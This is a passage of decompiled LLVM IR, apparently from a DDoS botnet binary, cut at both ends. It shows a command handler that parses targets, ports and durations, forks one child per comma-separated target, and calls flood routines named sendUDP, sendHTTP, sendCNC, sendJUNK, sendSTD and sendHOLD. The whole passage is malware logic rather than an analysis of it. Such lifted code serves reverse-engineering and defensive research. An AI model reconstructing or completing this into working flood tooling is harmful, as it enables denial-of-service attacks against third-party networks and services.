  store i1 %v5_805064e, i1* %cf.global-to-local, align 1
  %v1_8050651 = inttoptr i32 %v1_805064e to i32*
  %v2_8050651 = load i32, i32* %v1_8050651, align 4
  %v2_8050656 = call i32 @atol(i32 %v2_8050651)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp230 = icmp slt i32 %v2_8050656, 1
  %tmp231 = icmp eq i1 %tmp230, false
  br i1 %tmp231, label %dec_label_pc_8050664, label %dec_label_pc_8051255

dec_label_pc_8050664:                             ; preds = %dec_label_pc_805064b, %dec_label_pc_8050645
  %v1_8050667 = add i32 %tmp217, 4
  %v1_805066a = inttoptr i32 %v1_8050667 to i32*
  %v2_805066a = load i32, i32* %v1_805066a, align 4
  store i1 %v5_80505c9, i1* %cf.global-to-local, align 1
  %v2_8050678 = load i32, i32* %v1_80505cc, align 4
  %v2_805067d = call i32 @atol(i32 %v2_8050678)
  store i1 %v5_80505b0, i1* %cf.global-to-local, align 1
  %v2_805068e = load i32, i32* %v1_80505b3, align 4
  %v2_8050693 = call i32 @atol(i32 %v2_805068e)
  store i1 %v2_80505e2, i1* %cf.global-to-local, align 1
  %v2_80506a1 = load i32, i32* %v1_80505e5, align 4
  %v2_80506a6 = call i32 @atol(i32 %v2_80506a1)
  store i1 %v5_80505fb, i1* %cf.global-to-local, align 1
  %v2_80506b4 = load i32, i32* %v1_80505fe, align 4
  %v2_80506b9 = call i32 @atol(i32 %v2_80506b4)
  store i1 %v8_8050645, i1* %cf.global-to-local, align 1
  br i1 %v1_8050649, label %dec_label_pc_80506e9, label %dec_label_pc_80506c7

dec_label_pc_80506c7:                             ; preds = %dec_label_pc_8050664
  %v1_80506ca = add i32 %tmp217, 24
  %v5_80506ca = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_80506ca, i1* %cf.global-to-local, align 1
  %v1_80506cd = inttoptr i32 %v1_80506ca to i32*
  %v2_80506cd = load i32, i32* %v1_80506cd, align 4
  %v2_80506d2 = call i32 @atol(i32 %v2_80506cd)
  br label %dec_label_pc_80506e9

dec_label_pc_80506e9:                             ; preds = %dec_label_pc_8050664, %dec_label_pc_80506c7
  %storemerge9 = phi i32 [ %v2_80506d2, %dec_label_pc_80506c7 ], [ 10, %dec_label_pc_8050664 ]
  store i32 %storemerge9, i32* @esi, align 4
  %v4_8050700 = inttoptr i32 %v2_805066a to i8*
  %v4_8050703 = call i32 @__GI_strchr(i8* %v4_8050700, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050708 = icmp eq i32 %v4_8050703, 0
  br i1 %v1_8050708, label %dec_label_pc_8050790, label %dec_label_pc_8050710

dec_label_pc_8050710:                             ; preds = %dec_label_pc_80506e9
  store i32 %v2_805066a, i32* @eax, align 4
  %v3_8050721 = call i32 @__GI_strtok(i32 %v2_805066a, i32 ptrtoint (i32* @global_var_805b911.422 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805078871 = icmp eq i32 %v3_8050721, 0
  %v1_805078c78 = icmp eq i1 %v4_805078871, false
  br i1 %v1_805078c78, label %dec_label_pc_805072b, label %dec_label_pc_80507dd

dec_label_pc_805072b:                             ; preds = %dec_label_pc_8050710, %dec_label_pc_8050771
  %storemerge1479 = phi i32 [ %v3_8050780, %dec_label_pc_8050771 ], [ %v3_8050721, %dec_label_pc_8050710 ]
  %v0_805072b = call i32 @listFork()
  store i32 %v0_805072b, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050730 = icmp eq i32 %v0_805072b, 0
  %v1_8050732 = icmp eq i1 %v1_8050730, false
  br i1 %v1_8050732, label %dec_label_pc_8050771, label %dec_label_pc_8050734

dec_label_pc_8050734:                             ; preds = %dec_label_pc_805072b
  %v7_8050760 = call i32 @sendUDP(i32 %storemerge1479, i32 %v2_805067d, i32 %v2_8050693, i32 %v2_80506a6, i32 %v2_80506b9, i32 %storemerge9)
  %v2_805076c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050771:                             ; preds = %dec_label_pc_805072b
  %v3_8050780 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805b911.422 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050788 = icmp eq i32 %v3_8050780, 0
  %v1_805078c = icmp eq i1 %v4_8050788, false
  br i1 %v1_805078c, label %dec_label_pc_805072b, label %dec_label_pc_80507dd

dec_label_pc_8050790:                             ; preds = %dec_label_pc_80506e9
  %v0_8050790 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050795 = icmp eq i32 %v0_8050790, 0
  %v1_8050797 = icmp eq i1 %v1_8050795, false
  br i1 %v1_8050797, label %dec_label_pc_8051255, label %dec_label_pc_805079d

dec_label_pc_805079d:                             ; preds = %dec_label_pc_8050790
  %v7_80507cc = call i32 @sendUDP(i32 %v2_805066a, i32 %v2_805067d, i32 %v2_8050693, i32 %v2_80506a6, i32 %v2_80506b9, i32 %storemerge9)
  %v2_80507d8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80507dd:                             ; preds = %dec_label_pc_8050771, %dec_label_pc_8050710, %dec_label_pc_8050558
  %v2_80507e0 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_80507fd = inttoptr i32 %v2_80507e0 to i8*
  store i32 %v2_80507e0, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_805b9d0.447 to i32), i32* @edi, align 4
  %v7_805080f = call i32 @_strncmp(i8* %v4_80507fd, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805b9d0.447, i32 0, i32 0), i32 5)
  %v8_805080f = urem i32 %v7_805080f, 2
  %v9_805080f = icmp eq i32 %v8_805080f, 0
  %v0_8050811 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050811 = or i1 %v0_8050811, %v9_805080f
  %v3_8050811 = zext i1 %v2_8050811 to i32
  %v4_8050811 = load i32, i32* @edx, align 4
  %v5_8050811 = and i32 %v4_8050811, -256
  %v6_8050811 = or i32 %v3_8050811, %v5_8050811
  %v7_8050811 = xor i32 %v6_8050811, 1
  store i32 %v7_8050811, i32* @edx, align 4
  %v3_8050817 = and i32 %v7_805080f, -256
  %v1_8050819 = trunc i32 %v7_8050811 to i8
  %v3_8050819 = zext i1 %v0_8050811 to i8
  %v4_8050819 = sub nsw i8 %v1_8050819, %v3_8050819
  %v15_8050819 = icmp eq i8 %v4_8050819, 0
  %v20_8050819 = zext i8 %v4_8050819 to i32
  %v23_8050819 = or i32 %v20_8050819, %v3_8050817
  store i32 %v23_8050819, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050822 = icmp eq i1 %v15_8050819, false
  br i1 %v1_8050822, label %dec_label_pc_80509a8, label %dec_label_pc_8050828

dec_label_pc_8050828:                             ; preds = %dec_label_pc_80507dd
  %v2_805081d = sext i8 %v4_8050819 to i32
  %v9_8050828 = icmp ult i32 %arg1, 5
  store i1 %v9_8050828, i1* %cf.global-to-local, align 1
  %v7_805082c = icmp sgt i32 %arg1, 5
  br i1 %v7_805082c, label %dec_label_pc_8050832, label %dec_label_pc_8051255

dec_label_pc_8050832:                             ; preds = %dec_label_pc_8050828
  %v1_8050835 = add i32 %tmp217, 4
  %v5_8050835 = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_8050835, i1* %cf.global-to-local, align 1
  %v1_8050838 = inttoptr i32 %v1_8050835 to i32*
  %v2_8050838 = load i32, i32* %v1_8050838, align 4
  %v4_8050842 = inttoptr i32 %v2_8050838 to i8*
  %v4_8050845 = call i32 @__GI_strchr(i8* %v4_8050842, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_805084a = icmp eq i32 %v4_8050845, 0
  br i1 %v1_805084a, label %dec_label_pc_805091e, label %dec_label_pc_8050852

dec_label_pc_8050852:                             ; preds = %dec_label_pc_8050832
  store i1 %v5_8050835, i1* %cf.global-to-local, align 1
  %v2_8050858 = load i32, i32* %v1_8050838, align 4
  store i32 %v2_8050858, i32* @eax, align 4
  %v3_8050865 = call i32 @__GI_strtok(i32 %v2_8050858, i32 ptrtoint (i32* @global_var_805b911.422 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805090f63 = icmp eq i32 %v3_8050865, 0
  %v1_805091370 = icmp eq i1 %v4_805090f63, false
  br i1 %v1_805091370, label %dec_label_pc_8050872, label %dec_label_pc_80509a8

dec_label_pc_8050872:                             ; preds = %dec_label_pc_8050852, %dec_label_pc_80508f8
  %v0_8050872 = call i32 @listFork()
  store i32 %v0_8050872, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050877 = icmp eq i32 %v0_8050872, 0
  %v1_8050879 = icmp eq i1 %v1_8050877, false
  br i1 %v1_8050879, label %dec_label_pc_80508f8, label %dec_label_pc_805087b

dec_label_pc_805087b:                             ; preds = %dec_label_pc_8050872
  %v1_805087e = add i32 %tmp217, 24
  %v5_805087e = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_805087e, i1* %cf.global-to-local, align 1
  %v1_8050881 = inttoptr i32 %v1_805087e to i32*
  %v2_8050881 = load i32, i32* %v1_8050881, align 4
  %v2_8050886 = call i32 @atol(i32 %v2_8050881)
  store i32 %v2_8050886, i32* @ebx, align 4
  %v1_8050890 = add i32 %tmp217, 20
  %v5_8050890 = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_8050890, i1* %cf.global-to-local, align 1
  %v1_8050893 = inttoptr i32 %v1_8050890 to i32*
  %v2_8050893 = load i32, i32* %v1_8050893, align 4
  %v2_8050898 = call i32 @atol(i32 %v2_8050893)
  store i32 %v2_8050898, i32* @esi, align 4
  %v1_80508a2 = add i32 %tmp217, 16
  %v1_80508a5 = inttoptr i32 %v1_80508a2 to i32*
  %v2_80508a5 = load i32, i32* %v1_80508a5, align 4
  store i32 %v2_80508a5, i32* @edi, align 4
  %v1_80508ac = add i32 %tmp217, 12
  %v5_80508ac = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_80508ac, i1* %cf.global-to-local, align 1
  %v1_80508af = inttoptr i32 %v1_80508ac to i32*
  %v2_80508af = load i32, i32* %v1_80508af, align 4
  %v2_80508b4 = call i32 @atol(i32 %v2_80508af)
  %v1_80508b9 = urem i32 %v2_80508b4, 65536
  store i32 %v1_80508b9, i32* %edx.global-to-local, align 4
  %v1_80508c1 = add i32 %tmp217, 8
  %v1_80508c4 = inttoptr i32 %v1_80508c1 to i32*
  %v2_80508c4 = load i32, i32* %v1_80508c4, align 4
  store i1 %v5_8050835, i1* %cf.global-to-local, align 1
  %v2_80508ce = load i32, i32* %v1_8050838, align 4
  %v0_80508d0 = load i32, i32* @ebx, align 4
  %v0_80508d4 = load i32, i32* @esi, align 4
  %v0_80508d8 = load i32, i32* @edi, align 4
  %v7_80508e7 = trunc i32 %v2_80508b4 to i16
  %v8_80508e7 = call i32 @sendHTTP(i32 %v2_80508ce, i32 %v2_80508c4, i16 %v7_80508e7, i32 %v0_80508d8, i32 %v0_80508d4, i32 %v0_80508d0)
  %v2_80508f3 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80508f8:                             ; preds = %dec_label_pc_8050872
  %v3_8050907 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805b911.422 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_805090f = icmp eq i32 %v3_8050907, 0
  %v1_8050913 = icmp eq i1 %v4_805090f, false
  br i1 %v1_8050913, label %dec_label_pc_8050872, label %dec_label_pc_80509a8

dec_label_pc_805091e:                             ; preds = %dec_label_pc_8050832
  %v0_805091e = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050923 = icmp eq i32 %v0_805091e, 0
  %v1_8050925 = icmp eq i1 %v1_8050923, false
  br i1 %v1_8050925, label %dec_label_pc_8051255, label %dec_label_pc_805092b

dec_label_pc_805092b:                             ; preds = %dec_label_pc_805091e
  %v1_805092e = add i32 %tmp217, 24
  %v5_805092e = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_805092e, i1* %cf.global-to-local, align 1
  %v1_8050931 = inttoptr i32 %v1_805092e to i32*
  %v2_8050931 = load i32, i32* %v1_8050931, align 4
  %v2_8050936 = call i32 @atol(i32 %v2_8050931)
  store i32 %v2_8050936, i32* @ebx, align 4
  %v1_8050940 = add i32 %tmp217, 20
  %v5_8050940 = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_8050940, i1* %cf.global-to-local, align 1
  %v1_8050943 = inttoptr i32 %v1_8050940 to i32*
  %v2_8050943 = load i32, i32* %v1_8050943, align 4
  %v2_8050948 = call i32 @atol(i32 %v2_8050943)
  store i32 %v2_8050948, i32* @esi, align 4
  %v1_8050952 = add i32 %tmp217, 16
  %v1_8050955 = inttoptr i32 %v1_8050952 to i32*
  %v2_8050955 = load i32, i32* %v1_8050955, align 4
  store i32 %v2_8050955, i32* @edi, align 4
  %v1_805095c = add i32 %tmp217, 12
  %v5_805095c = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_805095c, i1* %cf.global-to-local, align 1
  %v1_805095f = inttoptr i32 %v1_805095c to i32*
  %v2_805095f = load i32, i32* %v1_805095f, align 4
  %v2_8050964 = call i32 @atol(i32 %v2_805095f)
  %v1_8050969 = urem i32 %v2_8050964, 65536
  store i32 %v1_8050969, i32* %edx.global-to-local, align 4
  %v1_8050971 = add i32 %tmp217, 8
  %v1_8050974 = inttoptr i32 %v1_8050971 to i32*
  %v2_8050974 = load i32, i32* %v1_8050974, align 4
  store i1 %v5_8050835, i1* %cf.global-to-local, align 1
  %v2_805097e = load i32, i32* %v1_8050838, align 4
  %v0_8050980 = load i32, i32* @ebx, align 4
  %v0_8050984 = load i32, i32* @esi, align 4
  %v0_8050988 = load i32, i32* @edi, align 4
  %v7_8050997 = trunc i32 %v2_8050964 to i16
  %v8_8050997 = call i32 @sendHTTP(i32 %v2_805097e, i32 %v2_8050974, i16 %v7_8050997, i32 %v0_8050988, i32 %v0_8050984, i32 %v0_8050980)
  %v2_80509a3 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_80509a8:                             ; preds = %dec_label_pc_80508f8, %dec_label_pc_8050852, %dec_label_pc_80507dd
  %v2_80509ab = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_80509c8 = inttoptr i32 %v2_80509ab to i8*
  store i32 %v2_80509ab, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805b9d5.448 to i32), i32* @edi, align 4
  %v7_80509da = call i32 @_strncmp(i8* %v4_80509c8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b9d5.448, i32 0, i32 0), i32 4)
  %v8_80509da = urem i32 %v7_80509da, 2
  %v9_80509da = icmp eq i32 %v8_80509da, 0
  %v0_80509dc = load i1, i1* %cf.global-to-local, align 1
  %v2_80509dc = or i1 %v0_80509dc, %v9_80509da
  %v3_80509dc = zext i1 %v2_80509dc to i32
  %v4_80509dc = load i32, i32* @edx, align 4
  %v5_80509dc = and i32 %v4_80509dc, -256
  %v6_80509dc = or i32 %v3_80509dc, %v5_80509dc
  %v7_80509dc = xor i32 %v6_80509dc, 1
  store i32 %v7_80509dc, i32* @edx, align 4
  %v1_80509e4 = trunc i32 %v7_80509dc to i8
  %v3_80509e4 = zext i1 %v0_80509dc to i8
  %v4_80509e4 = sub nsw i8 %v1_80509e4, %v3_80509e4
  %v15_80509e4 = icmp eq i8 %v4_80509e4, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80509ed = icmp eq i1 %v15_80509e4, false
  br i1 %v1_80509ed, label %dec_label_pc_8050b1a, label %dec_label_pc_80509f3

dec_label_pc_80509f3:                             ; preds = %dec_label_pc_80509a8
  %v2_80509e8 = sext i8 %v4_80509e4 to i32
  %v9_80509f3 = icmp ult i32 %arg1, 3
  store i1 %v9_80509f3, i1* %cf.global-to-local, align 1
  %v7_80509f7 = icmp sgt i32 %arg1, 3
  br i1 %v7_80509f7, label %dec_label_pc_80509fd, label %dec_label_pc_8051255

dec_label_pc_80509fd:                             ; preds = %dec_label_pc_80509f3
  %v1_8050a00 = add i32 %tmp217, 8
  %v5_8050a00 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_8050a00, i1* %cf.global-to-local, align 1
  %v1_8050a03 = inttoptr i32 %v1_8050a00 to i32*
  %v2_8050a03 = load i32, i32* %v1_8050a03, align 4
  %v2_8050a08 = call i32 @atol(i32 %v2_8050a03)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp232 = icmp slt i32 %v2_8050a08, 1
  br i1 %tmp232, label %dec_label_pc_8051255, label %dec_label_pc_8050a15

dec_label_pc_8050a15:                             ; preds = %dec_label_pc_80509fd
  %v1_8050a18 = add i32 %tmp217, 12
  %v5_8050a18 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_8050a18, i1* %cf.global-to-local, align 1
  %v1_8050a1b = inttoptr i32 %v1_8050a18 to i32*
  %v2_8050a1b = load i32, i32* %v1_8050a1b, align 4
  %v2_8050a20 = call i32 @atol(i32 %v2_8050a1b)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp233 = icmp slt i32 %v2_8050a20, 1
  %tmp234 = icmp eq i1 %tmp233, false
  br i1 %tmp234, label %dec_label_pc_8050a2e, label %dec_label_pc_8051255

dec_label_pc_8050a2e:                             ; preds = %dec_label_pc_8050a15
  %v1_8050a31 = add i32 %tmp217, 4
  %v1_8050a34 = inttoptr i32 %v1_8050a31 to i32*
  %v2_8050a34 = load i32, i32* %v1_8050a34, align 4
  store i1 %v5_8050a00, i1* %cf.global-to-local, align 1
  %v2_8050a3f = load i32, i32* %v1_8050a03, align 4
  %v2_8050a44 = call i32 @atol(i32 %v2_8050a3f)
  store i1 %v5_8050a18, i1* %cf.global-to-local, align 1
  %v2_8050a52 = load i32, i32* %v1_8050a1b, align 4
  %v2_8050a57 = call i32 @atol(i32 %v2_8050a52)
  %v4_8050a6a = inttoptr i32 %v2_8050a34 to i8*
  %v4_8050a6d = call i32 @__GI_strchr(i8* %v4_8050a6a, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050a72 = icmp eq i32 %v4_8050a6d, 0
  br i1 %v1_8050a72, label %dec_label_pc_8050ae8, label %dec_label_pc_8050a76

dec_label_pc_8050a76:                             ; preds = %dec_label_pc_8050a2e
  store i32 %v2_8050a34, i32* @eax, align 4
  %v3_8050a84 = call i32 @__GI_strtok(i32 %v2_8050a34, i32 ptrtoint (i32* @global_var_805b911.422 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050ae054 = icmp eq i32 %v3_8050a84, 0
  %v1_8050ae461 = icmp eq i1 %v4_8050ae054, false
  br i1 %v1_8050ae461, label %dec_label_pc_8050a8e, label %dec_label_pc_8050b1a

dec_label_pc_8050a8e:                             ; preds = %dec_label_pc_8050a76, %dec_label_pc_8050ac9
  %storemerge1662 = phi i32 [ %v3_8050ad8, %dec_label_pc_8050ac9 ], [ %v3_8050a84, %dec_label_pc_8050a76 ]
  %v0_8050a8e = call i32 @listFork()
  store i32 %v0_8050a8e, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050a93 = icmp eq i32 %v0_8050a8e, 0
  %v1_8050a95 = icmp eq i1 %v1_8050a93, false
  br i1 %v1_8050a95, label %dec_label_pc_8050ac9, label %dec_label_pc_8050a97

dec_label_pc_8050a97:                             ; preds = %dec_label_pc_8050a8e
  %v4_8050aab = call i32 @sendCNC(i32 %storemerge1662, i32 %v2_8050a44, i32 %v2_8050a57)
  %v0_8050ab0 = load i8*, i8** @global_var_805e480.20, align 4
  %v1_8050ab0 = ptrtoint i8* %v0_8050ab0 to i32
  %v2_8050ab8 = call i32 @__libc_close(i32 %v1_8050ab0)
  %v2_8050ac4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050ac9:                             ; preds = %dec_label_pc_8050a8e
  %v3_8050ad8 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805b911.422 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050ae0 = icmp eq i32 %v3_8050ad8, 0
  %v1_8050ae4 = icmp eq i1 %v4_8050ae0, false
  br i1 %v1_8050ae4, label %dec_label_pc_8050a8e, label %dec_label_pc_8050b1a

dec_label_pc_8050ae8:                             ; preds = %dec_label_pc_8050a2e
  %v0_8050ae8 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050aed = icmp eq i32 %v0_8050ae8, 0
  %v1_8050aef = icmp eq i1 %v1_8050aed, false
  br i1 %v1_8050aef, label %dec_label_pc_8051255, label %dec_label_pc_8050af5

dec_label_pc_8050af5:                             ; preds = %dec_label_pc_8050ae8
  %v4_8050b09 = call i32 @sendCNC(i32 %v2_8050a34, i32 %v2_8050a44, i32 %v2_8050a57)
  %v2_8050b15 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050b1a:                             ; preds = %dec_label_pc_8050ac9, %dec_label_pc_8050a76, %dec_label_pc_80509a8
  %v2_8050b1d = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_8050b3a = inttoptr i32 %v2_8050b1d to i8*
  store i32 %v2_8050b1d, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_805b9d9.449 to i32), i32* @edi, align 4
  %v7_8050b4c = call i32 @_strncmp(i8* %v4_8050b3a, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805b9d9.449, i32 0, i32 0), i32 6)
  %v8_8050b4c = urem i32 %v7_8050b4c, 2
  %v9_8050b4c = icmp eq i32 %v8_8050b4c, 0
  %v0_8050b4e = load i1, i1* %cf.global-to-local, align 1
  %v2_8050b4e = or i1 %v0_8050b4e, %v9_8050b4c
  %v3_8050b4e = zext i1 %v2_8050b4e to i32
  %v4_8050b4e = load i32, i32* @edx, align 4
  %v5_8050b4e = and i32 %v4_8050b4e, -256
  %v6_8050b4e = or i32 %v3_8050b4e, %v5_8050b4e
  %v7_8050b4e = xor i32 %v6_8050b4e, 1
  store i32 %v7_8050b4e, i32* @edx, align 4
  %v1_8050b56 = trunc i32 %v7_8050b4e to i8
  %v3_8050b56 = zext i1 %v0_8050b4e to i8
  %v4_8050b56 = sub nsw i8 %v1_8050b56, %v3_8050b56
  %v15_8050b56 = icmp eq i8 %v4_8050b56, 0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050b5f = icmp eq i1 %v15_8050b56, false
  br i1 %v1_8050b5f, label %dec_label_pc_8050cfb, label %dec_label_pc_8050b65

dec_label_pc_8050b65:                             ; preds = %dec_label_pc_8050b1a
  %v2_8050b5a = sext i8 %v4_8050b56 to i32
  %v9_8050b65 = icmp ult i32 %arg1, 3
  store i1 %v9_8050b65, i1* %cf.global-to-local, align 1
  %v7_8050b69 = icmp sgt i32 %arg1, 3
  br i1 %v7_8050b69, label %dec_label_pc_8050b6f, label %dec_label_pc_8051255

dec_label_pc_8050b6f:                             ; preds = %dec_label_pc_8050b65
  %v1_8050b72 = add i32 %tmp217, 8
  %v5_8050b72 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_8050b72, i1* %cf.global-to-local, align 1
  %v1_8050b75 = inttoptr i32 %v1_8050b72 to i32*
  %v2_8050b75 = load i32, i32* %v1_8050b75, align 4
  %v2_8050b7a = call i32 @atol(i32 %v2_8050b75)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp235 = icmp slt i32 %v2_8050b7a, 1
  br i1 %tmp235, label %dec_label_pc_8051255, label %dec_label_pc_8050b87

dec_label_pc_8050b87:                             ; preds = %dec_label_pc_8050b6f
  %v1_8050b8a = add i32 %tmp217, 12
  %v5_8050b8a = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_8050b8a, i1* %cf.global-to-local, align 1
  %v1_8050b8d = inttoptr i32 %v1_8050b8a to i32*
  %v2_8050b8d = load i32, i32* %v1_8050b8d, align 4
  %v2_8050b92 = call i32 @atol(i32 %v2_8050b8d)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp236 = icmp slt i32 %v2_8050b92, 1
  %tmp237 = icmp eq i1 %tmp236, false
  br i1 %tmp237, label %dec_label_pc_8050ba0, label %dec_label_pc_8051255

dec_label_pc_8050ba0:                             ; preds = %dec_label_pc_8050b87
  %v1_8050ba3 = add i32 %tmp217, 4
  %v1_8050ba6 = inttoptr i32 %v1_8050ba3 to i32*
  %v2_8050ba6 = load i32, i32* %v1_8050ba6, align 4
  store i1 %v5_8050b72, i1* %cf.global-to-local, align 1
  %v2_8050bb1 = load i32, i32* %v1_8050b75, align 4
  %v2_8050bb6 = call i32 @atol(i32 %v2_8050bb1)
  store i1 %v5_8050b8a, i1* %cf.global-to-local, align 1
  %v2_8050bc4 = load i32, i32* %v1_8050b8d, align 4
  %v2_8050bc9 = call i32 @atol(i32 %v2_8050bc4)
  %v4_8050bdc = inttoptr i32 %v2_8050ba6 to i8*
  %v4_8050bdf = call i32 @__GI_strchr(i8* %v4_8050bdc, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050be4 = icmp eq i32 %v4_8050bdf, 0
  br i1 %v1_8050be4, label %dec_label_pc_8050c97, label %dec_label_pc_8050bec

dec_label_pc_8050bec:                             ; preds = %dec_label_pc_8050ba0
  store i32 %v2_8050ba6, i32* @eax, align 4
  %v3_8050bfa = call i32 @__GI_strtok(i32 %v2_8050ba6, i32 ptrtoint (i32* @global_var_805b911.422 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050c8b45 = icmp eq i32 %v3_8050bfa, 0
  %v1_8050c8f52 = icmp eq i1 %v4_8050c8b45, false
  br i1 %v1_8050c8f52, label %dec_label_pc_8050c07, label %dec_label_pc_8050cfb

dec_label_pc_8050c07:                             ; preds = %dec_label_pc_8050bec, %dec_label_pc_8050c74
  %storemerge1753 = phi i32 [ %v3_8050c83, %dec_label_pc_8050c74 ], [ %v3_8050bfa, %dec_label_pc_8050bec ]
  %v0_8050c07 = call i32 @listFork()
  store i32 %v0_8050c07, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050c0c = icmp eq i32 %v0_8050c07, 0
  %v1_8050c0e = icmp eq i1 %v1_8050c0c, false
  br i1 %v1_8050c0e, label %dec_label_pc_8050c74, label %dec_label_pc_8050c10

dec_label_pc_8050c10:                             ; preds = %dec_label_pc_8050c07
  %v4_8050c24 = call i32 @sendJUNK(i32 %storemerge1753, i32 %v2_8050bb6, i32 %v2_8050bc9)
  %v4_8050c3d = call i32 @sendSTD(i32 %storemerge1753, i32 %v2_8050bb6, i32 %v2_8050bc9)
  %v4_8050c56 = call i32 @sendHOLD(i32 %storemerge1753, i32 %v2_8050bb6, i32 %v2_8050bc9)
  %v0_8050c5b = load i8*, i8** @global_var_805e480.20, align 4
  %v1_8050c5b = ptrtoint i8* %v0_8050c5b to i32
  %v2_8050c63 = call i32 @__libc_close(i32 %v1_8050c5b)
  %v2_8050c6f = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050c74:                             ; preds = %dec_label_pc_8050c07
  %v3_8050c83 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_805b911.422 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_8050c8b = icmp eq i32 %v3_8050c83, 0
  %v1_8050c8f = icmp eq i1 %v4_8050c8b, false
  br i1 %v1_8050c8f, label %dec_label_pc_8050c07, label %dec_label_pc_8050cfb

dec_label_pc_8050c97:                             ; preds = %dec_label_pc_8050ba0
  %v0_8050c97 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050c9c = icmp eq i32 %v0_8050c97, 0
  %v1_8050c9e = icmp eq i1 %v1_8050c9c, false
  br i1 %v1_8050c9e, label %dec_label_pc_8051255, label %dec_label_pc_8050ca4

dec_label_pc_8050ca4:                             ; preds = %dec_label_pc_8050c97
  %v4_8050cb8 = call i32 @sendJUNK(i32 %v2_8050ba6, i32 %v2_8050bb6, i32 %v2_8050bc9)
  %v4_8050cd1 = call i32 @sendSTD(i32 %v2_8050ba6, i32 %v2_8050bb6, i32 %v2_8050bc9)
  %v4_8050cea = call i32 @sendHOLD(i32 %v2_8050ba6, i32 %v2_8050bb6, i32 %v2_8050bc9)
  %v2_8050cf6 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_8050cfb:                             ; preds = %dec_label_pc_8050c74, %dec_label_pc_8050bec, %dec_label_pc_8050b1a
  %v2_8050cfe = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_8050d1b = inttoptr i32 %v2_8050cfe to i8*
  store i32 %v2_8050cfe, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805b9df.450 to i32), i32* @edi, align 4
  %v7_8050d2d = call i32 @_strncmp(i8* %v4_8050d1b, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805b9df.450, i32 0, i32 0), i32 4)
  %v8_8050d2d = urem i32 %v7_8050d2d, 2
  %v9_8050d2d = icmp eq i32 %v8_8050d2d, 0
  %v0_8050d2f = load i1, i1* %cf.global-to-local, align 1
  %v2_8050d2f = or i1 %v0_8050d2f, %v9_8050d2d
  %v3_8050d2f = zext i1 %v2_8050d2f to i32
  %v4_8050d2f = load i32, i32* @edx, align 4
